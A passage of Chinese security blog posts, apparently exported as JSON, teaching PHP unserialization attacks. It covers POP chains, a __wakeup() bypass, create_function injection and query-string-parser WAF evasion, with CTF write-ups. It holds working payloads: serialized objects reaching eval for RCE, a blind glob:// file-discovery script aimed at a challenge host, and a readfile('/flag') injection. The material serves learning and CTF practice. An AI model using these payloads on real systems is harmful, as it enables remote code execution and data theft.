unserialize()) -\u0026gt; __wakeup() -\u0026gt; __destruct() (-\u0026gt; echo()) -\u0026gt; __toString() (调用 __destruct() 的时候调用了echo $this, 触发了 __toString()) 大家可以单步调试一下，就能更好的理解这边的POP链以及这边用到的对象引用问题 Figure 1: 单步调试POP链\n那么我们现在只剩下flag的文件路径不知道了，此时就需要想办法利用 MyDirectory类 来 \u0026lt;?php class MyDirectory { public $name=\u0026#39;glob:///flag_\u0026#39;; } class MyFile { public $name=\u0026#39;/etc/hostname\u0026#39;; public $user=\u0026#39;\u0026#39;; } $a = new MyFile(); $a-\u0026gt;name = new MyDirectory(); $b = serialize($a); var_dump($b); print(urlencode($b)) // O:6:\u0026#34;MyFile\u0026#34;:2:{s:4:\u0026#34;name\u0026#34;;O:11:\u0026#34;MyDirectory\u0026#34;:1:{s:4:\u0026#34;name\u0026#34;;s:13:\u0026#34;glob:///flag_\u0026#34;;}s:4:\u0026#34;user\u0026#34;;s:0:\u0026#34;\u0026#34;;} 我们这里利用PHP伪协议， glob:// 来匹配查找文件路径，利用测信道攻击，即如果glob匹配成功，则返回的是 /etc/hostname 其中避免包含\u0026rsquo;root\u0026rsquo;字段，如果不是，则返回 /etc/passwd 然后逐步拼接flag的字符串，就和我们在sql注入中的盲注是一个道理 import requests url = \u0026#39;http://124.16.75.162:31102/\u0026#39; flag = \u0026#39;\u0026#39; # 假设flag最多有40个字符这么长 for _ in range(1,40): # 利用匹配Ascii字符 for i in range(32,128): if i == 37 or i == 42 or i == 63: continue param = r\u0026#39;?input=O:6:\u0026#34;MyFile\u0026#34;:2:{s:4:\u0026#34;name\u0026#34;;O:11:\u0026#34;MyDirectory\u0026#34;:1: {s:4:\u0026#34;name\u0026#34;;s:\u0026#39;+str(14+_)+\u0026#39;:\u0026#34;glob:///flag_\u0026#39;+flag+chr(i)+\u0026#39;%2a\u0026#34;;}S:4:\u0026#34;us\\\\65r\u0026#34;;s :0:\u0026#34;\u0026#34;;}\u0026#39; res = requests.get(url+param) # 测信道攻击，根据返回的文件内容判断是否匹配上了 if \u0026#39;root\u0026#39; in res.text: flag += chr(i) print(flag) # 最后得到路径 # flag_fecd0d9b-2852-497d-b829-0c5bf11c5021 [极客大挑战 2019]PHP1 猫猫真不错，但是不能给flag啊 根据文字提示，直接先用dirsearch爆破一下目录看看有没有备份文件 ./dirsearch.py -u http://63038eb9-d80a-4dba-ac04-c7cc6f1b1592.node4.buuoj.cn:81/ -e php Figure 2: 利用dirsearch找到备份文件\n接着我们下载该文件 解压缩后就发现了网页的所有备份文件 index.php \u0026lt;?php include \u0026#39;class.php\u0026#39;; $select = $_GET[\u0026#39;select\u0026#39;]; $res=unserialize(@$select); ?\u0026gt; class.php \u0026lt;?php include \u0026#39;flag.php\u0026#39;; error_reporting(0); class Name{ private $username = \u0026#39;nonono\u0026#39;; private $password = \u0026#39;yesyes\u0026#39;; public function __construct($username,$password){ $this-\u0026gt;username = $username; $this-\u0026gt;password = $password; } function __wakeup(){ $this-\u0026gt;username = \u0026#39;guest\u0026#39;; } function __destruct(){ if ($this-\u0026gt;password != 100) { echo \u0026#34;\u0026lt;/br\u0026gt;NO!!!hacker!!!\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#34;You name is: \u0026#34;; echo $this-\u0026gt;username;echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; echo \u0026#34;You password is: \u0026#34;; echo $this-\u0026gt;password;echo \u0026#34;\u0026lt;/br\u0026gt;\u0026#34;; die(); } if ($this-\u0026gt;username === \u0026#39;admin\u0026#39;) { global $flag; echo $flag; }else{ echo \u0026#34;\u0026lt;/br\u0026gt;hello my friend~~\u0026lt;/br\u0026gt;sorry i can\u0026#39;t give you the flag!\u0026#34;; die(); } } } ?\u0026gt; 看到这些魔术方法我们自然就想到要构建 POP链来进行反序列化调用 只要__destruct() 的时候满足 $this-\u0026gt;username = \u0026lsquo;admin\u0026rsquo;, $this-\u0026gt;password = 100 即可输出flag，但是 __wakeup() 却会在一开始就修改 $this-\u0026gt;username 的值，因此我们要想办法绕过 __wakeup() 在反序列化字符串时，如果一个对象申明的属性个数大于实际个数时，就会自动跳过 __wakeup() 的执行，我们构造payload \u0026lt;?php class Name{ private $username=\u0026#39;admin\u0026#39;; private $password=100; } $p = new Name; $s = serialize($p); var_dump($s); print(urlencode($s)); ?\u0026gt; Figure 3: Payload serialisation payload\n接着我们修改申明的属性个数 O%3A4%3A%22Name%2 3 %3A2%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D http://63038eb9-d80a-4dba-ac04-c7cc6f1b1592.node4.buuoj.cn:81/?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bi%3A100%3B%7D Figure 4: 得到Flag！\n参考： CTF-Web-[极客大挑战 2019]PHP ","date":"2022-06-19T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/php_unserialize_examples/","title":"PHP 反序列化实例练习"},{"content":"PHP 序列化与反序列化 PHP程序为了保护和转储对象 object，提供了序列化 serialize的方法，其将一个对象转换成字符串，但仅保留对象里的成员变量，不保留函数方法 PHP序列化的函数为 serialize, 反序列化的函数为 unserialize Serialize 序列化 什么序列化呢，我们直接通过一个例子来看一下 \u0026lt;?php class Test{ public $a=\u0026#34;ThisA\u0026#34;; protected $b=\u0026#34;ThisB\u0026#34;; private $c=\u0026#34;ThisC\u0026#34;; public function test1(){ return \u0026#39;this is test1\u0026#39;; } } $test = new Test(); var_dump(serialize($test)); ?\u0026gt; 序列化后就会产生如下的字节流，其主要目的是为了保存PHP中所有的类，方法，变量的类型以及他们所组成的结构 Figure 1: serialize()\nserialize(mixed $value): string 序列化后的字节流详解 接着我们具体来分析一下这一串字节流代表什么内容 O 表示 object 对象， :4 表示对象名的长度有4个字符 :\u0026quot;Test\u0026quot; 表示对象的名称， :3 表示该对象中有3个成员变量 通过括号来表示结果，表示接下来是对象里面的成员变量，因为变量涉及到变量名以及变量的值，因此它们都会被序列化，并用 ; 来进行分割： s:1:\u0026quot;a\u0026quot; 是序列化变量名的结果 s 表示是字符串， 1 表示只有一个字符， :\u0026quot;a\u0026quot; 表示值为 a 其他同理可得 接下来我们根据一篇古老文章来具体了解一下对象中的属性的序列化格式：PHP 序列化（serialize）格式详解 a - array b - boolean d - double i - integer o - common object r - reference s - non-escaped binary string S - escaped binary string C - custom object O - class N - null R - pointer reference U - unicode string NULL的序列化 N; boolean b:\u0026lt;digit\u0026gt;; \u0026lt;digit\u0026gt; = [\u0026lsquo;0\u0026rsquo;, \u0026lsquo;1\u0026rsquo;], 当boolean型数据为false时，序列化后的成员值为0 integer i:\u0026lt;number\u0026gt;; \u0026lt;number\u0026gt;的取值范围为：-2147483648 到 2147483647，允许有符号，如果超过范围，就会被序列化为浮点数而不是整型，并且反序列化后也无法得到原来的数值 double d:\u0026lt;number\u0026gt;; \u0026lt;number\u0026gt;为浮点数，其范围为PHP中浮点数的范围一样大,并且可以表示为整型、浮点数型以及科学计数法 如果值为正/负无穷大，那么会被会被表示为INF/-INF，如果超过能表示的最小精度或者非数（NAN）的情况，就会返回0 string s:\u0026lt;length\u0026gt;:\u0026quot;\u0026lt;value\u0026gt;\u0026quot;; S:\u0026lt;length\u0026gt;:\u0026quot;\u0026lt;value\u0026gt;\u0026quot;; \u0026lt;length\u0026gt;是\u0026lt;value\u0026gt;的长度，是非负整数，允许带有正号（+） \u0026lt;value\u0026gt;表示字符串值，其范围与 ASCII 相对应，没有转义字符 s表示普通的使用方法 S表示可以在字符串值中加入ASCII转义编码（从而进行绕过），编码的方式为 对于ASCII码小于128的字符（不包括 \u0026lsquo;\\\u0026rsquo;）,按照单个字节直接写入 对于ASCII码在128~255的字符和 \u0026lsquo;\\\u0026rsquo; 字符，需要将其ASCII码值转化为16进制编码的字符串，以\u0026rsquo;\\\u0026lsquo;作为开头，后两个字节分别为这个字符的16进制编码 这样的方法同样适用于所有的ASCII字符，例如 r就可以转换为\\72，都可以在\u0026rsquo;S\u0026rsquo; 下被解析成功 array a:\u0026lt;n\u0026gt;:{\u0026lt;key_1\u0026gt;\u0026lt;value_1\u0026gt;\u0026lt;key_2\u0026gt;\u0026lt;value_2\u0026gt;\u0026hellip;\u0026lt;key_n\u0026gt;\u0026lt;value_n\u0026gt;} \u0026lt;n\u0026gt;表示数组元素的个数 \u0026lt;key_1\u0026gt;就表示数组下标 \u0026lt;value_1\u0026gt;就表示对应的数组元素的值 \u0026lt;key_1\u0026gt;下标的类型只能是整型或者字符串类型 对象的序列化 O:\u0026lt;length\u0026gt;:\u0026quot;\u0026lt;class_name\u0026gt;\u0026quot;:\u0026lt;n\u0026gt;:{\u0026lt;field_name_1\u0026gt;\u0026lt;field_value_1\u0026gt;\u0026lt;field_name_2\u0026gt;\u0026lt;field_value_2\u0026gt;\u0026hellip;\u0026lt;field_name_n\u0026gt;\u0026lt;field_value_n\u0026gt;} \u0026lt;length\u0026gt;表示对象的类名\u0026lt;class_name\u0026gt;的字符串长度 \u0026lt;n\u0026gt;表示对象中的属性个数，这里不包括 static \u0026amp; const 声明的静态属性，也就是说只有对象特有的属性才会被序列化 \u0026lt;filed_name\u0026gt;表示每个属性的名字，用之前提到过的字符串类型进行表示，例如：s:1:\u0026ldquo;a\u0026rdquo;; 以及对应的\u0026lt;filed_value\u0026gt;值，可以是任何类型的，s:1:\u0026ldquo;a\u0026rdquo;;N;比如是一个NULL 访问控制修饰符 我们可以观察到后面的变量名和变量值也是一一对应的，但是变量名的表示根据 Access Modifiers, 访问控制修饰符 的不同而有不同的表示方法 public(公有) protected(受保护) // %00*%00属性名 private(私有的) // %00类名%00属性名 protected属性被序列化的时候属性值会变成 %00*%00属性名 private属性被序列化的时候属性值会变成 %00类名%00属性名 （%00为空白符，空字符也有长度，一个空字符长度为 1） 就如同我们这里的结果： s:4:\u0026#34;*b\u0026#34;; = s:4:\u0026#34;%00*%00b\u0026#34;; s:7:\u0026#34;Testc\u0026#34;; = s:7:\u0026#34;%00Test%00c\u0026#34;; 对象引用和指针引用 R:r 我们根据一个例子来看看两种引用的区别 \u0026lt;?php echo \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;; class SampleClass { var $value; } $a = new SampleClass(); $a-\u0026gt;value = $a; $b = new SampleClass(); $b-\u0026gt;value = \u0026amp;$b; echo serialize($a); echo \u0026#34;\\n\u0026#34;; echo serialize($b); echo \u0026#34;\\n\u0026#34;; $a-\u0026gt;value = 1; $b-\u0026gt;value = 1; var_dump($a); var_dump($b); echo \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;; ?\u0026gt; 结果是： O:11:\u0026#34;SampleClass\u0026#34;:1:{s:5:\u0026#34;value\u0026#34;;r:1;} O:11:\u0026#34;SampleClass\u0026#34;:1:{s:5:\u0026#34;value\u0026#34;;R:1;} // after re-value object(SampleClass)[1] public \u0026#39;value\u0026#39; =\u0026gt; int 1 int 1 我们可以从源码中看出区别就在于 '\u0026amp;' 特别是在经过重新赋值之后： $a-\u0026gt;value变成了int(1) 而$b整一个对象直接变成了int(1) 原因就是‘\u0026amp;’进行指针引用后，使$b-\u0026gt;value 与$b本身进行绑定，其中一个的改变也会影响另一个 引用标识之后的数字\n对象引用（r）和指针引用（R）的格式为： r:\u0026lt;number\u0026gt;; R:\u0026lt;number\u0026gt;; \u0026lt;number\u0026gt;表示的就是，当前这个引用，所引用的对象，在序列化字节流中，是第几个出现的（包括其中复合型成员的子成员） 我们通过一个例子来讲解一下： \u0026lt;?php class ClassA { var $int; var $str; var $bool; var $obj; var $pr; } $a = new ClassA(); $a-\u0026gt;int = 1; $a-\u0026gt;str = \u0026#34;Hello\u0026#34;; $a-\u0026gt;bool = false; $a-\u0026gt;obj = $a; $a-\u0026gt;pr = \u0026amp;$a-\u0026gt;str; echo serialize($a); ?\u0026gt; 结果是： O:6:\u0026ldquo;ClassA\u0026rdquo;:5:{s:3:\u0026ldquo;int\u0026rdquo;;i:1;s:3:\u0026ldquo;str\u0026rdquo;;s:5:\u0026ldquo;Hello\u0026rdquo;;s:4:\u0026ldquo;bool\u0026rdquo;;b:0;s:3:\u0026ldquo;obj\u0026rdquo;;r:1;s:2:\u0026ldquo;pr\u0026rdquo;;R:3;} 我们先来看结果： $a-\u0026gt;pr序列化后的结果为 'R:3;' 表示引用了第三个出现的成员 那么在这个序列化字节流中，第一个成员是ClassA对象，第二个就是对象中的子成员 $a-\u0026gt;int，第三个就是 $a-\u0026gt;str 也就是我们这里所进行引用的对象，也就会被标记为 'R:3;' Unserialize 反序列化 \u0026lt;?php class Test { public $a = \u0026#39;This A\u0026#39;; protected $b = \u0026#39;This B\u0026#39;; private $c = \u0026#39;This C\u0026#39;; public function test() { return \u0026#39;this is test\u0026#39;; } } $test = new Test(); $sTest = serialize($test); $usTest = unserialize($sTest); print_r($usTest); ?\u0026gt; 结果如下： Figure 2: unserialize 反序列化\n我们看反序列化后的内容就可以更好的理解为什么要进行序列化 Magic Methods 魔术方法 很多教程都提到了魔术方法的概念，但没有进行定义和解释，官网的定义总结如下： 魔术方法是定义在类内部的以 __ 开头的方法，通过对魔术方法的实现可以重写PHP对于对象的默认操作，例如序列化等 __construct() #类似C++构造函数,当一个对象创建时被调用,但在unserialize()时是不会自动调用的 __destruct() #当一个对象没有后续被引用时，被调用（注意说销毁并不准确），当一个对象的 __toString() #当一个对象被当作一个字符串使用时被调用 __invoke() #当脚本尝试将对象调用为函数时触发 __sleep() #serialize()时会自动调用 __wakeup() #unserialize()时会自动调用 __call() #当调用对象中不存在的方法会自动调用该方法。 __get() #在调用私有属性的时候会自动执行 __set() #用于将数据写入不可访问的属性（根据Access modifilers来判断,e.g., protected, private） __isset() #在不可访问的属性上调用isset()或empty()触发 __unset() #在不可访问的属性上使用unset()时触发 我们来举个例子看看这些魔术方法如何对反序列化造成影响 继续沿用我们上面的例子 \u0026lt;?php class Test { public $a = \u0026#39;This A\u0026#39;; protected $b = \u0026#39;This B\u0026#39;; private $c = \u0026#39;This C\u0026#39;; public function test() { return \u0026#39;this is test\u0026#39;; } public function __wakeup() { $this-\u0026gt;c=\u0026#39;This is not c\u0026#39;; } } $test = new Test(); $sTest = serialize($test); $usTest = unserialize($sTest); var_dump($usTest); 我们通过实现一个 __wakeup 方法，其会在反序列化时自动被调用，同时修改 $c 的值 Figure 3: __wakeup()\n建议大家可以单步调试一下下面的代码，可以有助于理解每一个魔术方法的具体作用 \u0026lt;?php # 设置一个类A class A{ private $name = \u0026#34;V0W\u0026#34;; function __construct() { echo \u0026#34;__construct() call\\n\u0026#34;; } function __destruct() { echo \u0026#34;\\n__destruct() call\\n\u0026#34;; } function __toString() { return \u0026#34;__toString() call\\n\u0026#34;; } function __sleep() { echo \u0026#34;__sleep() call\\n\u0026#34;; return array(\u0026#34;name\u0026#34;); } function __wakeup() { echo \u0026#34;__wakeup() call\\n\u0026#34;; } function __get($a) { echo \u0026#34;__get() call\\n\u0026#34;; return $this-\u0026gt;name; } function __set($property, $value) { echo \u0026#34;\\n__set() call\\n\u0026#34;; $this-\u0026gt;$property = $value; } function __invoke() { echo \u0026#34;__invoke() call\\n\u0026#34;; } } //调用 __construct() $a = new A(); //调用 __toSting() echo $a; //调用 __sleep() $b = serialize($a); echo $b; //调用 __wakeup() $c = unserialize($b); echo $c; //不存在这个bbbb属性，调用 __get() echo $a-\u0026gt;bbbb; //name是私有变量，不允许修改，调用 __set() $a-\u0026gt;name = \u0026#34;pro\u0026#34;; echo $a-\u0026gt;name; //将对象作为函数，调用 __invoke() $a(); //程序结束，调用 __destruct() //会调用两次__destruct，因为中间有一次反序列化 //第一次是因为反序列化后的对象$c没有被使用了，最后一次是因为$a没有再被使用了 Property Oriented Programming (POP) 面向属性编程 这个概念根据我的调查，应该不是类似于，面向对象编程（e.g., JAVA）,面向过程编程（C）这种传统意义上的编程，而是安全领域独有的一种形式。 这也导致了我一开始很难理解这个概念，因为不同的师傅用中英文写出来的理解总有一些差别 因此我们这里先不着急给POP Chain下定义，先来看一个很简单的例子，然后也许大家能够理解我对于POP的总结与定义 \u0026lt;?php class Example { private $obj; function __construct() { // some PHP code... } function __wakeup() { if (isset($this-\u0026gt;obj)) return $this-\u0026gt;obj-\u0026gt;evaluate(); } } class CodeSnippet { private $code; function evaluate() { if (isset($this-\u0026gt;code)) { eval($this-\u0026gt;code); } } } // some PHP code... if (isset($_POST[\u0026#39;data\u0026#39;])) { $user_data = unserialize($_POST[\u0026#39;data\u0026#39;]); } 上面的代码定义了两个类，Example以及CodeSnippet 其中Example中首先定义了一个私有的属性 $obj 同时实现了 __wakeup() 魔术方法，回忆一下，其会在反序列化的时候被调用，然后执行 $obj 这个属性中的方法 evaluate() CodeSnippet中也有一个私有属性 $code 实现了一个方法 evaluate() 其可以执行 $code 中的PHP代码 然后该PHP脚本会对POST的变量 data 进行反序列化 隐隐约约大家应该也能感受到些什么，反序列化？__wakeup()会在反序列化中被调用？ 我们接着来看我们到底可以进行怎样的利用： \u0026lt;?php class CodeSnippet { private $code = \u0026#34;phpinfo();\u0026#34;; } class Example { private $obj; function __construct() { $this-\u0026gt;obj = new CodeSnippet(); } } print urlencode(serialize(new Example())); 黑客可以构造以上的PHP脚本，目的是为了输出一个序列化后的内容 首先定义了一个codeSnippet类，并且其中有一个私有属性 $code 其中包含了php代码 接着定义了一个Example类，其中有一个私有属性 $obj, 同时实现了魔术方法 __construct, 其中构造了一个新的 CodeSnippet 对象，并赋值给 $obj 最后新建一个Example类并进行序列化后进行url编码后输出 Figure 4: PHP Chain serialized output\nO%3A7%3A%22Example%22%3A1%3A%7Bs%3A12%3A%22%00Example%00obj%22%3BO%3A11%3A%22CodeSnippet%22%3A1%3A%7Bs%3A17%3A%22%00CodeSnippet%00code%22%3Bs%3A10%3A%22phpinfo%28%29%3B%22%3B%7D%7D 之后将序列化的字符串作为POST变量提交到服务端脚本，就可以实现RCE Figure 5: RCE成功执行\n这里值得注意的几件事是 PHP中变量的调用记得用isset先做判断否则会出现如下warning Figure 6: Warning for undefinied property\n要注意使用浏览器工具是否如你所想，大家可以看到我用了很多hackbar类似的插件，他们总会出现一些问题，比如对于url的过度解析，或者是加入一下不必要的参数，因此出现奇怪的问题的时候，可以用Burp抓包来看一看，然后最稳健的方法还是Burp来进行HTTP请求，最直观。 至此，我们可以来总结一下这个例子并给出POP的定义 我们在能够获取服务端脚本源码的情况下，通过对于反序列化函数 unserialize() 会调用 __wakeup() 魔术方法的特性， 构造Example以及CodeSnippet类， 同时为其中的 属性 （$code）进行赋值， 并且可以通过 __construct() 方法来新建 CodeSnippet 对象($this-\u0026gt;obj) 接着序列化后作为一个对象（有属性的值的）发送给服务端脚本 进而服务端会在反序列化的时候调用 __wakepup(), 并利用我们已经定义好了属性值进行执行，导致RCE的发生 POP面向属性编程，就是我们通过构造 目标脚本 中类的 object ，并且为其 property, 属性 赋值，继而这些 property, 属性 会作为 敏感函数 的参数来执行恶意行为： 命令执行：exec()、passthru()、popen()、system() 文件操作：file_put_contents()、file_get_contents()、unlink() POP Chain 就是从魔术方法开始，想办法找到一条调用链，比如我们用到的例子中： unserialize() -\u0026gt; __wakeup() -\u0026gt; evaluate() -\u0026gt; eval() 就是一条POP链，我们就是要找到这样一条函数调用链，最终执行输入的恶意代码 以上就是全部的基础知识的信息，之后我们就可以通过具体的题目来进行进一步的巩固和拓展（应该会新开一篇文章来记录） 常用技巧 绕过魔术方法 __wakeup()\n在反序列化字符串时，如果一个对象申明的属性个数大于实际个数时，就会自动跳过 __wakeup() 的执行 （此方法只适用于PHP5 \u0026lt; 5.6.25, PHP7 \u0026lt; 7.0.10） 例如 O:4:\u0026ldquo;Name\u0026rdquo;:2:{s:14:\u0026ldquo;�Name�username\u0026rdquo;;s:5:\u0026ldquo;admin\u0026rdquo;;s:14:\u0026ldquo;�Name�password\u0026rdquo;;i:100;} 👇 O:4:\u0026ldquo;Name\u0026rdquo;:3:{s:14:\u0026ldquo;�Name�username\u0026rdquo;;s:5:\u0026ldquo;admin\u0026rdquo;;s:14:\u0026ldquo;�Name�password\u0026rdquo;;i:100;} 这个情况下就会绕过 __wakeup() 执行 配合PHP伪协议 使用 glob:// 伪协议来查找特定的文件路径（同时可以配合测信道攻击使用） 序列化成员绕过 字符串绕过\n通过将字符串标识符 s 修改成 S 便可以解释十六进制字符，进而将被过滤的字符串使用ASCII替换，从而进行绕过 引用绕过\n例如不允许序列化字节流出现 'R:2': 修改变量的申明的顺序，即可修改R:2后面的数字 修改为不同的引用方式，可以在R/r中切换 属性赋值覆盖绕过 可以通过浅copy来为受限的属性赋值 例如以下代码，就将 $a-\u0026gt;user 作为引用传递给 $a-\u0026gt;name 从而保持两个值的一致，即使 $a-\u0026gt;name 被修改或者过滤，但是通过 $a-\u0026gt;user 依然可以对其进行修改 $a-\u0026gt;name = \u0026amp;$a-\u0026gt;user; Reference serialize:php.net Magic+Methods:php.net PHP反序列化漏洞简介及相关技巧小结 PHP序列化反序列化漏洞总结（一篇懂） PHP反序列化漏洞说明 php反序列化与POP链 Php+Destruct+Called+Twice PHP+Object+Injection+Exploitation+Notes Diving+into+unserialize():+POP+Chains php反序列化利用——POP链构造实例 \u0026ldquo;Notice: Undefined variable\u0026rdquo;, \u0026ldquo;Notice: Undefined index\u0026rdquo;, \u0026ldquo;Warning: Undefined array key\u0026rdquo;, and \u0026ldquo;Notice: Undefined offset\u0026rdquo; using PHP Laravel+POP链简析 PHP序列化中的R与r ","date":"2022-06-14T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/php_serialize_unserialize/","title":"PHP 序列化与反序列化"},{"content":"如何绕过PHP查询字符串解释器 本文的内容主要参考或者说翻译自 Abusing PHP query string parser to bypass IDS, IPS, and WAF 我们知道PHP通过向url中增加query参数来获取 $_GET 的值，也可以从HTTP request中增加 $_POST 的值，当这些内容发送到后端后，会首先被转换成数组元素，例如 /?foo=bar 会变成 Array([foo] =\u0026gt; \u0026quot;bar\u0026quot;) ,而这项工作就是由 query string parser 来完成的。 查询字符串解释器， query string parser 首先会删除一些参数中的字符或者用下划线 _ 来进行替代。 例如 /?$20news[id%00=42 会被转换成 Array([news_id] =\u0026gt; 42) 如果IDPS or WAF定义了 new_id 的参数不能为非数字的符号就可以用以上的方法进行绕过 Figure 1: Example1\n此时， %20news[id%00 将会被存储到 $_GET[\u0026quot;new_id\u0026quot;] 中去 Why? PHP需要将所有的参数都转换成合法的变量名，为了保证变量名可以用， query string parser 会做两件事情： 移除开头的空格 将一些字符转换为下划线（包括空格） 例如： 用户输入 URL解码后 PHP实际存储变量名 %20foo_bar%00 foo_bar foo_bar foo%20bar%00 foo bar foo_bar foo%5bbar foo[bar foo_bar [What does a bash sequence \u0026lsquo;\\033999D\u0026rsquo; mean and where is it explained? \u0026lt;?php foreach ([ \u0026#34;{chr}foo_bar\u0026#34;, \u0026#34;foo{chr}bar\u0026#34;, \u0026#34;foo_bar{chr}\u0026#34; ] as $k =\u0026gt; $arg) { for ($i = 0; $i \u0026lt;= 255; ++$i) { echo \u0026#34;\\033[999D\\033[K\\r\u0026#34;; echo \u0026#34;[\u0026#34; . $arg . \u0026#34;] check \u0026#34; . bin2hex(chr($i)) . \u0026#34;\u0026#34;; parse_str(str_replace(\u0026#34;{chr}\u0026#34;, chr($i), $arg) . \u0026#34;=bla\u0026#34;, $o); usleep(5000); // 找到parse_str结果是 foo_bar 所对应的字符 if (isset($o[\u0026#34;foo_bar\u0026#34;])) { echo \u0026#34;\\033[999D\\033[K\\r\u0026#34;; echo $arg . \u0026#34; -\u0026gt; \u0026#34; . bin2hex(chr($i)) . \u0026#34; (\u0026#34; . chr($i) . \u0026#34;)\\n\u0026#34;; } } echo \u0026#34;\\033[999D\\033[K\\r\u0026#34;; echo \u0026#34;\\n\u0026#34;; } \\033 是C语言风格的八进制字符，表示一个转义符号， [999D 表示将cursor光标回退999列，作用是强制将光标返回到开头， [k 表示清空当前行的内容， \\r 还是和我们平常见到的一样的作用，就是将光标返回到一行的开头 这种编码主要和终端模拟器又关系，不同的终端模拟器使用不同的库可能效果就不一样，比如 ANSI X3.64 以及 ECMA-48 两种标准。 parse_str 方法会被用在 get, post, cookie 的参数获取上，通过三种形式来观察 parse_str 的行为，我们可以看到以下的符号（除去那些分隔符）可以被 parse_str 方法错误的解释为 foo_bar Figure 2: parse_str.php\nFigure 3: Characters pass the parse_str 1\nFigure 4: Characters pass the parse_str 2\n","date":"2022-06-09T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/php_bypass_query_string_parser/","title":"如何利用PHP查询字符串解释器来绕过IDPS以及WAF"},{"content":"PHP特性绕过技巧 create_function 绕过 参考： [代码审计]PHP代码审计之create_function()函数 适用范围： PHP 4\u0026gt; = 4.0.1，PHP 5，PHP 7 create_function 的目的是为了构建一个匿名函数，并可以赋值给一个变量 create_function(string $args,string $code) - string $args 声明的函数变量部分 - string $code 执行的方法代码部分 基本使用 \u0026lt;?php $q = $_GET(\u0026#39;query\u0026#39;); $newfunc = create_function(\u0026#39;$a\u0026#39;, \u0026#39;echo $a\u0026#39;); echo \u0026#34;function name: $newfunc\\n\u0026#34;; $newfunc($q); ?\u0026gt; Figure 1: Output value\n我们要关注的是这个匿名函数实际上做了一件什么事情， create_function() 会创建一个匿名函数（lambda格式），用lambda命名， \u0026lt;?php function lambda_2($a){ echo $a; } ?\u0026gt; 记住这个函数是真的需要构造的，然后我们来看看 create_function 注入的例子 注入实例 \u0026lt;?php //sorry , here is true last level //^_^ error_reporting(0); include \u0026#34;str.php\u0026#34;; $a = $_GET[\u0026#39;a\u0026#39;]; $b = $_GET[\u0026#39;b\u0026#39;]; if(preg_match(\u0026#39;/^[a-z0-9_]*$/isD\u0026#39;,$a)){ show_source(__FILE__); } else{ $a(\u0026#39;\u0026#39;,$b); } 我们不关注这个正则的细节，只需要知道我们可以用反斜杠来表示全局空间Global space来绕过就可以了 直接看payload ?a=\\create_function\u0026amp;b=;}readfile(\u0026#39;/flag\u0026#39;); // 我一开始对于看到很多人使用花括号很不理解，感觉都无法闭合括号是怎么回事，但是记得刚才我们说的匿名函数的构造吗，我们来看一下这里构造了一个怎么样的匿名函数 create_function(\u0026#39;\u0026#39;, \u0026#39;;}readfile(\u0026#39;/flag\u0026#39;); /*\u0026#39;) \u0026lt;?php function lambda_1(){ ; }readfile(\u0026#39;/flag\u0026#39;); /* 注释 } ?\u0026gt; 这里只是创造了一个匿名函数，但是没有任何的赋值，因此是无法直接执行的，因此我们需要先用 } 来闭合匿名函数的定义，然后在外面执行我们想要注入的代码即可 is_numberic() 绕过 参考：[极客大挑战 2019]BuyFlag 1 对于空字符 %00, 无论放在前后都可以判断为非数值 %20 放在数值后面也可以判定为非数值 strcmp 绕过 参考： [极客大挑战 2019]BuyFlag 1 strcmp:php.net strcmp(string $string1, string $string2): int Return \u0026lt; 0; string1的长度小于string2 Return \u0026gt; 0; string1的长度大于string2 Return = 0; string1的长度等于string2 穿入非字符串类型的数据，函数发生错误在 5.3 版本之前，在显示了报错的警告信息之后，将return 0，作用与长度相等一致 因此我们可以通过穿入数组类型来完成绕过 弱类型 参考：php 弱类型总结 一直到碰到弱类型比较的题目，但是总感觉很零碎，看到一片总结的文章，就想着跟着学一学，总结一下 强类型，弱类型 首先我们来区分一下强类型语言和弱类型语言的区别 强类型语言，就是在定义一个变量的时候，就需要指定变量的类型，如果不经转换（手动或者自动）就使用就会报错，例如Java，C都是强类型的语言，我们都需要先定义类型才能进行赋值 弱类型语言，就是在定义一个变量的时候，无需定义类型，想怎么使用，用什么赋值都可以，语言的解析器回自动转换，例如php，python都是弱类型的语言，我们在使用的时候就能明显感受 PHP中的比较是否相等 参考： Comparison Operators:php.net php中比较两个变量是否相等有两种运算符 $a == $b, Equal 相等，返回true只要 $a 在类型转换之后等于 $b 即可（因此会先转换成相同的类型，再比较值）; $a === $b, identical 一致，返回true只有 $a 与 $b 完全相等，即值一样，同时类型也相等（因此回显判断类型再比较值, !== 亦是如此） \u0026lt;?php var_dump(0 == \u0026#34;a\u0026#34;); // true var_dump(\u0026#34;1\u0026#34; == \u0026#34;01\u0026#34;); // true var_dump(\u0026#34;10\u0026#34; == \u0026#34;1e1\u0026#34;); // true var_dump(100 == \u0026#34;1e2\u0026#34;); // true var_dump(\u0026#34;admin\u0026#34;==0); // true var_dump(\u0026#34;1admin\u0026#34;==1); // true var_dump(\u0026#34;admin1\u0026#34;==1); // flase var_dump(\u0026#34;admin1\u0026#34;==0); // true var_dump(\u0026#34;0e123456\u0026#34;==\u0026#34;0e4456789\u0026#34;); // true ?\u0026gt; 这是PHP8.0.0前的特性，即在比较字符串和数字的时候，string会先被转换成数字，然后再进行比较 因此我们可以看到： 0 == \u0026ldquo;a\u0026rdquo;, var_dump(\u0026ldquo;admin\u0026rdquo;==0); 都会先将字符串先强制转换成数值，变成0，然后再进行比较，自然就相等了 同时，当一个字符串被强制转换类型变成Int的时候，php文档给出的规则是： If the string is numeric or leading numeric then it will resolve to the corresponding integer value, otherwise it is converted to zero (0). 即如果string能够被解析成为int或者string的开头是数字，那么就会被转换成对应的整型值，否则都转换成0 那么什么情况下string会被解析成int呢 官网给出的正则表达https://www.php.net/manual/en/language.types.numeric-strings.php式 WHITESPACES \\s* // 若干空格 LNUM [0-9]+ // 普通的数字 DNUM ([0-9]*)[\\.]{LNUM}) | ({LNUM}[\\.][0-9]*) // float EXPONENT_DNUM (({LNUM} | {DNUM}) [eE][+-]? {LNUM}) //科学计数法 INT_NUM_STRING {WHITESPACES} [+-]? {LNUM} {WHITESPACES} 